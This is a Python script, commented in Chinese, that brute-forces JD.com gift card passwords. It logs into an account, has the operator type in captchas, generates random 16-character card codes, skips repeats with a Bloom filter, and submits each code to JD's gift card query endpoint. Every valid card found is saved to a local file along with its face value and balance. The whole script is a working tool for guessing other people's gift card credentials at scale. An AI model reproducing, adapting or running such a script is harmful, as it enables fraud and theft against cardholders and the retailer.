#!/usr/bin/env python3  
# -*- coding: utf-8 -*-
# from datetime import datetime
# import urllib.request
import logging
import traceback
import os
# import pytesseract
from PIL import Image
import random
import loginUtil
from bs4 import BeautifulSoup
import BloomFilterUtil
import fileUtil
import windowsUtil
import jsonUtil
import time

#每个位置可供选择的单词或数字
wordList=['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
#获取新的验证码图片的接口url
verifyCodeUrl='http://mygiftcard.jd.com/giftcard/JDVerification.aspx?uid=%s'
#通过如下url获取新的uuid
uuidUrl='http://mygiftcard.jd.com/giftcard/index.action'
#检查一个pwd是否可用的url
checkPwdUrl="http://mygiftcard.jd.com/giftcard/queryBindGiftCard.action?t="
#待初始化的uuid
UUID=''
#本地验证码临时存放目录
imgPath='E:/private/image/'
cardPath='E:/private/card/'
bf=None
VERIFY_CODE=''
#做初始化操作
def init():
    #创建验证码目录
    if os.path.exists(imgPath) != True: #目录不存在就创建
        os.makedirs(imgPath)
    #创建card目录
    if os.path.exists(cardPath) != True: #目录不存在就创建
        os.makedirs(cardPath)
    #初始化密码
    loginUtil.init()
    #登录
    loginUtil.processCookie()
    passportRes = loginUtil.Navigate(loginUtil.loginPostUrl,loginUtil.packagePostData())
    print('login response: %s' % passportRes)
    global UUID
    #初始化UUID
    UUID=getNewUUID()
#     print('UUID is : %s' % UUID)
    global verifyCodeUrl
    verifyCodeUrl = verifyCodeUrl % UUID
    global bf
    bf = BloomFilterUtil.BloomFilter(0.001, 100000000)
#获取新的uuid
def getNewUUID():
    try:
        source_code = loginUtil.Navigate(uuidUrl)
#         print('get new uuid:')
#         print(source_code)
        soup = BeautifulSoup(source_code,"html.parser")
#         uuid = soup.find('img', {'id':'verifyImg'})
        uuid = soup.find_all('img',{'id':'verifyImg'})[0]['src'].split("?uid=")[1].split("&")[0]
        if uuid == None:
            print("鬼知道什么原因，居然没有uuid!")
        else:
#             print("获取到的uuid为：%s" % uuid)
            return uuid
    except Exception as e:
        print("Error",e)
        logging.exception(e)
        traceback.print_exc()
#保存验证码图片&&获取文本的验证码
def getNewVerifyCode(verifyCodeUrl):
    verifyCodeUrl = verifyCodeUrl+'&t='+str(random.random())
    global VERIFY_CODE
    #下载验证码图片
#     print('开始获取验证码：%s' % verifyCodeUrl)
    try:
        codeLocalPath = fileUtil.downCode(verifyCodeUrl)
#         print('验证码识别中.......')
        image=Image.open(codeLocalPath)
        image.show()
        vcode = input("请输入弹出图片中的验证码：") 
#         vcode = pytesseract.image_to_string(image)
        #关闭图片查看器
        windowsUtil.closeWin()
        VERIFY_CODE = vcode
        return vcode
    except Exception as e:
        print('Error:',e)
        traceback.print_exc()
        logging.exception(e)
#获取下一个随机不重复的密码
def getNewRandPwd():
    i=0
    pwd=''
    numList = get16RandomNum()
    for index in numList:
        pwd+=wordList[index]
        i+=1
        if( i>0 and i<16 and (i % 4==0) ):
            pwd+='-'
    return pwd
def get16RandomNum():
    #使用表理解(list comprehension)一次性生成多个随机数,range函数输入不同的值，可以设置需要生成随机数的个数
    return [random.randint(0,35) for _ in range(16)]
#根据返回的错误码拿到对应的中文错误描述信息
def getMsgByCode(code):
    errMsg=''
    if code == 'binded':
        errMsg = '此卡已被绑定'
    elif code == 'inactive':
        errMsg = '此卡未激活不能绑定'
    elif code == 'verifyerr':
        errMsg = '抱歉！请填写正确的验证码'
    elif code == 'verifyexpired':
        errMsg = '抱歉！验证码已过期，请重新获取验证码'
    elif code == 'nofind':
        errMsg = '没有找到此卡信息,请重新输入卡密，谢谢！'
    elif code == 'nologin':
        errMsg = '抱歉！请先登录京东商城'
    elif code == 'valuenull':
        errMsg = '抱歉！没有找到符合条件的卡'
    elif code == 'pinconflict':
        errMsg = '>抱歉！转换卡需要登录本人账号操作'
    elif code == 'nobalance':
        errMsg = '抱歉！无余额的京东卡无法完成转换'
    elif code == 'alreadchanged':
        errMsg = '抱歉！已经转换的京东卡无法转换'
    else:
        errMsg = '在处理过程中发生了错误,请稍后再重试，谢谢！'
    return errMsg
#检查密码是否有效
def checkIfPassValid(url,uuid,pwd,verifyCode):
    url = url+str(random.random())
#     print('check pass url: %s' % url)
    postData = {
      'actionType':'query',
      'uuid':uuid,
      'giftCardId':'undefined',
      'giftCardPwd':pwd,
      'verifyCode':verifyCode
    }
#     print('check pass post data: %s' % postData)
    checkRes = loginUtil.Navigate(url,postData)
    print('check pwd:%s' % pwd)
    print('check response: %s' % checkRes)
    code = jsonUtil.getAttr(checkRes,'code')
    if code == 'success':
        print('----------------------------------成功找到一个可用的E卡密码:%s---------------------------------' % pwd)
        #将有效的卡密写到文件
        cardObj = jsonUtil.getAttr(checkRes,'data')[0]
        #密码，面值，余额，giftCardType，cardBrand，giftCardId，激活时间，有效期开始，有效期结束
        cardStr = pwd+','+cardObj['amountTotal']+','+cardObj['amount']+','+cardObj['giftCardType']+','+cardObj['cardBrand']+','+cardObj['giftCardId']+','+cardObj['timeActived']+','+cardObj['timeBegin']+','+cardObj['timeEnd']+'\n'
        fileUtil.appendTextFile(cardPath+'list.txt', cardStr)
    elif (code == 'verifyexpired' or code == 'verifyerr'):
        getNewVerifyCode(verifyCodeUrl)
        print('更新验证码成功!继续走着...')
    else:
        print('此密码验证未通过:[%s]' % getMsgByCode(code))
    
if __name__=='__main__':
    init()
    #循环检查随机密码 每次的randPwd和verifyCode不一样 其他的参数不变
    getNewVerifyCode(verifyCodeUrl)
    for i in range(10000):
        randPwd = getNewRandPwd()
        #如果已经存在就重新生成随机密码
        while(bf.is_element_exist(randPwd)):
            randPwd = getNewRandPwd()
        checkIfPassValid(checkPwdUrl,UUID,randPwd,VERIFY_CODE)
        time.sleep(0.1)
        
    
        
    
